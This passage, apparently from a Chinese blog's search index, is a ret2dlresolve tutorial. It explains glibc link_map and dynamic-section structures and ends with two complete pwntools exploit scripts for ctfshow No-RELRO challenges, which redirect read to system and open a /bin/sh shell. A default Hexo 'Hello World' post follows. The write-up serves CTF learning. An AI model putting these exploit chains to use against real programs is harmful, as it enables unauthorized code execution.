title="link_map结构体"></a>link_map结构体</h4><p><code>link_map</code>是描述已加载的共享对象的结构体，采用双链表管理，该数据结构保存在<code>ld.so</code>的<code>.bss</code>段中。我们主要关注其中几个域</p><ol><li><p><code>l_addr</code>：共享对象的加载基址；</p></li><li><p><code>l_next</code>，<code>l_prev</code>：管理<code>link_map</code>的双链表指针；</p></li><li><p><code>l_info</code>：保存<code>Elfxx_Dyn</code>结构体指针的列表，用来寻找各节基址；如<code>l_info[DT_STRTAB]</code>指向保存着函数解析字符串表基址的<code>Elfxx_Dyn</code>结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/* 描述已加载共享对象的结构体。`l_next` 和 `l_prev` 成员</span><br><span class="line">   形成了在启动时加载的所有共享对象的链表。</span><br><span class="line">   这些数据结构存在于运行时动态链接器使用的空间中；</span><br><span class="line">   修改它们可能会导致严重后果。</span><br><span class="line">   如果有必要，这个数据结构在未来可能会改变。</span><br><span class="line">   用户级程序必须避免定义此类型的对象。  */</span><br><span class="line">struct link_map</span><br><span class="line">  &#123;</span><br><span class="line">    /* 以下几个成员是与调试器协议的一部分。</span><br><span class="line">       这与 SVR4 中使用的格式相同。  */</span><br><span class="line">    ElfW(Addr) l_addr;             /* ELF 文件中的地址与内存中地址之间的差异。  */</span><br><span class="line">    char *l_name;                  /* 对象文件的绝对路径名。  */</span><br><span class="line">    ElfW(Dyn) *l_ld;               /* 共享对象的动态段。  */</span><br><span class="line">    struct link_map *l_next, *l_prev; /* 已加载对象的链表。  */</span><br><span class="line"></span><br><span class="line">    /* 以下所有成员仅供动态链接器内部使用。</span><br><span class="line">       它们可能会在没有通知的情况下更改。  */</span><br><span class="line"></span><br><span class="line">    /* 当在多个命名空间中使用时，这个元素与指向相同类型的副本的指针不同。  */</span><br><span class="line">    struct link_map *l_real;</span><br><span class="line"></span><br><span class="line">    /* 此 link map 所属的命名空间的编号。  */</span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    struct libname_list *l_libname;</span><br><span class="line"></span><br><span class="line">    /* 动态段信息数组。 */</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">    const ElfW(Phdr) *l_phdr;      /* 指向内存中程序头表的指针。  */</span><br><span class="line">    ElfW(Addr) l_entry;            /* 入口点位置。  */</span><br><span class="line">    ElfW(Half) l_phnum;            /* 程序头表条目数量。  */</span><br><span class="line">    ElfW(Half) l_ldnum;            /* 动态段条目数量。  */</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="Elfxx-Dyn结构体"><a href="#Elfxx-Dyn结构体" class="headerlink" title="Elfxx_Dyn结构体"></a>Elfxx_Dyn结构体</h4><p>Elf(32&#x2F;64)_Dyn结构体存放在<code>.dynamic</code>节中，说具体些就是键值对，关键字是各个动态段的标识，值则是各个动态段的对应的基址，包括之前说的的<code>.ret.plt</code>、<code>.dynsym</code>、<code>dynstr</code>节等。其主要作用就是在解析函数地址时使用这些键值对来找到各个动态段的基址，以确定数据条目的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Sword   d_tag;                  /* Dynamic entry type */</span><br><span class="line">  union                                 </span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                 /* Integer value */</span><br><span class="line">      Elf32_Addr d_ptr;                 /* Entry Address */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword        d_tag;           /* Dynamic entry type */</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;               /* Integer value */</span><br><span class="line">      Elf64_Addr d_ptr;                /* Address value */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p><code>d_tag</code>定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/* Legal values for d_tag (dynamic entry type).  */</span><br><span class="line">#define DT_NULL                0                /* Marks end of dynamic section */</span><br><span class="line">#define DT_NEEDED              1                /* Name of needed library */</span><br><span class="line">#define DT_PLTRELSZ            2                /* Size in bytes of PLT relocs */</span><br><span class="line">#define DT_PLTGOT              3                /* Processor defined value */</span><br><span class="line">#define DT_HASH                4                /* Address of symbol hash table */</span><br><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_RELA                7                /* Address of Rela relocs */</span><br><span class="line">#define DT_RELASZ              8                /* Total size of Rela relocs */</span><br><span class="line">#define DT_RELAENT             9                /* Size of one Rela reloc */</span><br><span class="line">#define DT_STRSZ              10                /* Size of string table */</span><br><span class="line">#define DT_SYMENT             11                /* Size of one symbol table entry */</span><br><span class="line">#define DT_INIT               12                /* Address of init function */</span><br><span class="line">#define DT_FINI               13                /* Address of termination function */</span><br><span class="line">#define DT_SONAME             14                /* Name of shared object */</span><br><span class="line">#define DT_RPATH              15                /* Library search path (deprecated) */</span><br><span class="line">#define DT_SYMBOLIC           16                /* Start symbol search here */</span><br><span class="line">#define DT_REL                17                /* Address of Rel relocs */</span><br><span class="line">#define DT_RELSZ              18                /* Total size of Rel relocs */</span><br><span class="line">#define DT_RELENT             19                /* Size of one Rel reloc */</span><br><span class="line">#define DT_PLTREL             20                /* Type of reloc in PLT */</span><br><span class="line">#define DT_DEBUG              21                /* For debugging; unspecified */</span><br><span class="line">#define DT_TEXTREL            22                /* Reloc might modify .text */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br><span class="line">#define DT_BIND_NOW           24                /* Process relocations of object */</span><br><span class="line">#define DT_INIT_ARRAY         25                /* Array with addresses of init fct */</span><br><span class="line">#define DT_FINI_ARRAY         26                /* Array with addresses of fini fct */</span><br><span class="line">#define DT_INIT_ARRAYSZ       27                /* Size in bytes of DT_INIT_ARRAY */</span><br><span class="line">#define DT_FINI_ARRAYSZ       28                /* Size in bytes of DT_FINI_ARRAY */</span><br><span class="line">#define DT_RUNPATH            29                /* Library search path */</span><br><span class="line">#define DT_FLAGS              30                /* Flags for the object being loaded */</span><br><span class="line">#define DT_ENCODING           32                /* Start of encoded range */</span><br><span class="line">#define DT_PREINIT_ARRAY      32                /* Array with addresses of preinit fct*/</span><br><span class="line">#define DT_PREINIT_ARRAYSZ    33                /* size in bytes of DT_PREINIT_ARRAY */</span><br><span class="line">#define DT_SYMTAB_SHNDX       34                /* Address of SYMTAB_SHNDX section */</span><br><span class="line">#define DT_NUM                35                /* Number used */</span><br></pre></td></tr></table></figure><p>我们需要关心的也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br></pre></td></tr></table></figure><p>分别存放了dynstr节、dynsym节、.rel.plt节的基址</p><p>那么我们各个节在内存中的具体结构如图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">===============================================</span><br><span class="line">|      Related sections       |   Structure   |</span><br><span class="line">===============================================</span><br><span class="line">|          .dynamic           | Elf_Dyn entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    Functions    | Variables |      ---      |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .ret.plt     | .ret.dyn  | Elf_Rel entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .dynsym      | .dynsym   | Elf_Sym entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .dynstr      | .dynstr   | Strings       |</span><br><span class="line">+-----------------+-----------+---------------+</span><br></pre></td></tr></table></figure><h3 id="大概解析流程"><a href="#大概解析流程" class="headerlink" title="大概解析流程"></a>大概解析流程</h3><p>下面直接放张图方便理解</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/202406051458206-1745939812039-7.png" alt="img"></p><h3 id="动态调式查看具体解析流程"><a href="#动态调式查看具体解析流程" class="headerlink" title="动态调式查看具体解析流程"></a>动态调式查看具体解析流程</h3><p>直接这样说肯定不足以深入理解的，所以接下来会通过动态调式来查看具体解析流程</p><h4 id="确定link-map中l-info的地址"><a href="#确定link-map中l-info的地址" class="headerlink" title="确定link_map中l_info的地址"></a>确定link_map中l_info的地址</h4><p>不同的glibc版本l_info可能不同，网上并没有找到一个准确的偏移</p><p>但是通过观察link_map结构体不难发现l_info之前的成员有8个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l_addr</span><br><span class="line">l_name</span><br><span class="line">l_ld</span><br><span class="line">l_next</span><br><span class="line">l_prev</span><br><span class="line">l_real</span><br><span class="line">l_ns</span><br><span class="line">l_libname</span><br></pre></td></tr></table></figure><p>那么通常情况下偏移应该就是0x20(调式环境为32位，如果是64位偏移通常应该是0x40)</p><p>知道了l_info的地址，就可以通过相关的d_tag的地址找到我们需要的段的基地址了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_23-43-35-1745939812039-9.png" alt="Snipaste_2025-03-04_23-43-35"></p><h4 id="确定动态链接所需的几个节的地址"><a href="#确定动态链接所需的几个节的地址" class="headerlink" title="确定动态链接所需的几个节的地址"></a>确定动态链接所需的几个节的地址</h4><p>然后我们通过d_tag找到对应段的基地址</p><p>这里给出一个公式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DT_xxx_addr = ptr [l_info_addr + lenth * (offset - 1)]</span><br><span class="line">lenth为字长</span><br><span class="line">offset位DT_xxx对应于l_info的条目</span><br></pre></td></tr></table></figure><h5 id="dynstr-addr"><a href="#dynstr-addr" class="headerlink" title="dynstr_addr"></a>dynstr_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_STRTAB_addr = ptr [0xf7ffda44 + 0x4 * (5 - 1)] = 0x8049804</span><br></pre></td></tr></table></figure><p>我们可以发现动态调试和我们在IDA里看到的却是是一样的</p><p>dynstr的地址是0x0804824C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_STRTAB_addr = ptr [l_info_addr + 0x4 * (5-1)]</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-05_00-07-40-1745939812039-13.png" alt="Snipaste_2025-03-05_00-07-40"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305002003747-1745939812039-11.png" alt="image-20250305002003747"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305002029521-1745939812039-15.png" alt="image-20250305002029521"></p><h5 id="dynsym-addr"><a href="#dynsym-addr" class="headerlink" title="dynsym_addr"></a>dynsym_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_SYMTAB_addr = ptr [0xf7ffda44 + 0x4 * (6 - 1)] = 0x804980c</span><br></pre></td></tr></table></figure><p>dynsym的地址是0x080481AC</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003048577-1745939812039-17.png" alt="image-20250305003048577"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003232146-1745939812039-19.png" alt="image-20250305003232146"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003304085-1745939812039-21.png" alt="image-20250305003304085"></p><h5 id="rel-plt-addr"><a href="#rel-plt-addr" class="headerlink" title=".rel.plt_addr"></a>.rel.plt_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_JMPREL_addr = ptr [0xf7ffda44 + 0x4 * (23 - 1)] = 0x8049844</span><br></pre></td></tr></table></figure><p>.rel.plt的地址是0x8048304</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305004030135.png" alt="image-20250305004030135"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003736753.png" alt="image-20250305003736753"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003844655.png" alt="image-20250305003844655"></p><h4 id="通过read函数来观察是怎么找到符号名称的"><a href="#通过read函数来观察是怎么找到符号名称的" class="headerlink" title="通过read函数来观察是怎么找到符号名称的"></a>通过read函数来观察是怎么找到符号名称的</h4><p>read函数的reloc_index是8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r_info = ptr [.rel.plt_addr + reloc_index + lenth] = 0x207</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305004650994.png" alt="image-20250305004650994"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305005337679.png" alt="image-20250305005337679"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st_name = ptr [dynsym_addr + (r_info&gt;&gt;8) * 0x10] = 0x27</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305011200923.png" alt="image-20250305011200923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_str = ptr [.dynstr_addr + st_name] = /* &#x27;read&#x27; */</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305011401972.png" alt="image-20250305011401972"></p><h2 id="ret2dlresolve之No-Relro"><a href="#ret2dlresolve之No-Relro" class="headerlink" title="ret2dlresolve之No-Relro"></a>ret2dlresolve之No-Relro</h2><h3 id="32位下No-Relro"><a href="#32位下No-Relro" class="headerlink" title="32位下No-Relro"></a>32位下No-Relro</h3><p>以ctfshow中的pwn82为例</p><p>进入到ctfshow函数中，发现有溢出点</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305185526111.png" alt="image-20250305185526111"></p><p>因为是No-Relro所以.dynamic可写，那么我们直接将.dynamic中的DT_STRTAB的值给改成我们恶意伪造在bss段上的.dynstr节(将任意函数名替换成system)的地址就可以直接进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;,28268)</span><br><span class="line">#sh = process(&#x27;./pwn1&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh, &#x27;b *0x8048513\nc&#x27;)</span><br><span class="line">pop_3 = 0x08048629</span><br><span class="line">read_plt_next = 0x08048376</span><br><span class="line">bss_addr = 0x080498E0</span><br><span class="line"></span><br><span class="line">DT_STRTAB_addr = 0x08049808</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x6C + 0x4) + p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(DT_STRTAB_addr) + p32(4)</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr + 0x100) + p32(len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr) + p32(len(fake_dynstr))</span><br><span class="line">payload += p32(read_plt_next) + p32(0xdeadbeef) + p32(bss_addr + 0x100)</span><br><span class="line">sh.sendlineafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line">sh.send(p32(bss_addr))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下No-Relro"><a href="#64位下No-Relro" class="headerlink" title="64位下No-Relro"></a>64位下No-Relro</h3><p>以ctfshow Pwn84为例，由于是64位所以需要寄存器传参，但是由于没有合适的gadget，这里采用ret2csu</p><p>而且只能溢出0x30个字节，显然不够用，所以还要先进行一次Stack Pivot</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250306103950624.png" alt="image-20250306103950624"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">sh = process(&#x27;./pwn2&#x27;)</span><br><span class="line">#gdb.attach(sh, &#x27;b *0x40063B\nc&#x27;)</span><br><span class="line">#sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28161)</span><br><span class="line">DT_STRTAB_addr = 0x600990</span><br><span class="line">read_plt_next = 0x400516</span><br><span class="line">pop_rdi = 0x400773</span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">csu_front_addr = 0x400750</span><br><span class="line">csu_end_addr = 0x40076A</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line">pivot_addr = elf.bss(0x100) - 0x8</span><br><span class="line">pop_rbp_ret = 0x400588</span><br><span class="line">leave_ret = 0x40063c</span><br><span class="line">ret_addr = 0x4004c6</span><br><span class="line">def ret2csu(fuction, rdi, rsi, rdx):</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(1)</span><br><span class="line">    payload += p64(fuction)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    return payload</span><br><span class="line">def ret2csu_end():</span><br><span class="line">    return cyclic(0x38)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x100),0x150)</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(0x40063E)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x300),len(fake_dynstr))</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,DT_STRTAB_addr,0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x250),len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(pop_rdi) + p64(elf.bss(0x250)) + p64(read_plt_next) + p64(0xdeadbeef)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70) + p64(pivot_addr) + p64(leave_ret)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line">sh.send(p64(elf.bss(0x300)))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/29/hello-world/"/>
      <url>/2025/04/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
